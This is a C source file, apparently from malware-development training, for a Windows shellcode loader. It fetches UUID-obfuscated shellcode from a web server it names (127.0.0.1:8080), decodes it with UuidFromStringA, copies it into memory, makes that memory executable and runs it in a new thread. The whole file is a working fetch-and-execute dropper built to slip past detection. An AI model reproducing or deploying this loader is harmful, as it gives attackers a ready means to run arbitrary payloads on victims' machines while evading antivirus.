#include <Windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

#define NumberOfElements 17
// Python3 -m http.server 8080
// Have shellcodeuuid.txt in the directory
#define PAYLOAD L"http://127.0.0.1:8080/shellcodeuuid.txt"

// https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa
typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
    RPC_CSTR	StringUuid,
    UUID* Uuid
    );

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE		pBuffer = NULL,
            TmpBuffer = NULL;

    SIZE_T		sBuffSize = NULL;

    RPC_STATUS 	STATUS = NULL;

    // Getting UuidFromStringA address from Rpcrt4.dll
    fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
    if (pUuidFromStringA == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Getting the real size of the shellcode which is the number of UUID strings * 16
    sBuffSize = NmbrOfElements * 16;

    // Allocating memory which will hold the deobfuscated shellcode
    //pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
    pBuffer = (PBYTE)VirtualAlloc(NULL, sBuffSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pBuffer == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Setting TmpBuffer to be equal to pBuffer
    TmpBuffer = pBuffer;

    // Loop through all the UUID strings saved in UuidArray
    for (int i = 0; i < NmbrOfElements; i++) {

        // Deobfuscating one UUID string at a time
        // UuidArray[i] is a single UUID string from the array UuidArray
        if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
            // if it failed
            printf("[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X", UuidArray[i], STATUS);
            return FALSE;
        }

        // 16 bytes are written to TmpBuffer at a time
        // Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
        TmpBuffer = (PBYTE)(TmpBuffer + 16);

    }

    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;

    return TRUE;
}

BOOL GetUUIDFromUrl(LPCWSTR szUrl, CHAR* UUID[]) {

    BOOL		bSTATE = TRUE;

    HINTERNET	hInternet = NULL,
                hUrl = NULL;

    //char* UuidArray[NumberOfElements];

    // Read and store the UUIDs from the URL without null terminators
    char buffer[36]; // Assuming each UUID has 36 characters without a null terminator
    DWORD bytesRead;

    // Opening the internet session handle, all arguments are NULL here since no proxy options are required
    hInternet = InternetOpenW(L"MalDevEin", NULL, NULL, NULL, NULL);
    if (hInternet == NULL) {
        printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Opening the handle to the payload using the payload's URL
    hUrl = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (hUrl == NULL) {
        printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    for (int i = 0; i < NumberOfElements; i++) {
        if (!InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead)) {
            printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
            InternetCloseHandle(hUrl);
            InternetCloseHandle(hInternet);
            return -1;
        }
        // Allocate memory for the UUID and copy the buffer
        UUID[i] = (char*)malloc(bytesRead);
        if (UUID[i] == NULL) {
            perror("Error allocating memory");
            InternetCloseHandle(hUrl);
            InternetCloseHandle(hInternet);
            return -1;
        }
        memcpy(UUID[i], buffer, bytesRead);
    }


_EndOfFunction:
    if (hInternet)
        InternetCloseHandle(hInternet);											// Closing handle 
    if (hUrl)
        InternetCloseHandle(hUrl);										// Closing handle
    if (hInternet)
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
    return bSTATE;
}

int main() {

    char* UuidArray[NumberOfElements];

    PBYTE	Bytes = NULL;
    SIZE_T	Size = NULL;

    // Reading the payload 
    if (!GetUUIDFromUrl(PAYLOAD, &UuidArray)) {
        return -1;
    }

    // Now UuidArray contains the UUIDs read from the web server

    // You can print them to verify
    for (int i = 0; i < NumberOfElements; i++) {
        printf("UuidArray[%d]: %s\n", i, UuidArray[i]);
    }

    if (!UuidDeobfuscation(UuidArray, NumberOfElements, &Bytes, &Size)) {
        return -1;
    }

    printf("[i] Bytes : 0x%p \n", Bytes);
    printf("[i] Size  : %ld \n", Size);

    // Allocating memory the size of Size
   // With memory permissions set to read and write so that we can write the payload later
    PVOID pShellcodeAddress = VirtualAlloc(NULL, Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return -1;
    }

    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    printf("[#] Press <Enter> To Write Payload ... ");
    getchar();

    // Copying the payload to the allocated memory
    memcpy(pShellcodeAddress, Bytes, Size);
    // Cleaning the pDeobfuscatedPayload buffer, since it is no longer needed
    memset(Bytes, '\0', Size);

    DWORD dwOldProtection = NULL;
    // Setting memory permissions at pShellcodeAddress to be executable
    if (!VirtualProtect(pShellcodeAddress, Size, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return -1;
    }

    printf("[#] Press <Enter> To Run ... ");
    getchar();

    // Running the shellcode as a new thread's entry 
    HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);

    if (hThread == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return -1;
    }

    //Wait for infinite time until the thread executes the shellcode
    WaitForSingleObject(hThread, INFINITE);

    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    // Close the thread handle when you're done with it
    CloseHandle(hThread);
    // Free the executable buffer
    VirtualFree(Bytes, 0, MEM_RELEASE);
    VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);

    // Don't forget to free the memory when done
    for (int i = 0; i < 17; i++) {
        free(UuidArray[i]);
    }

    return 0;
}
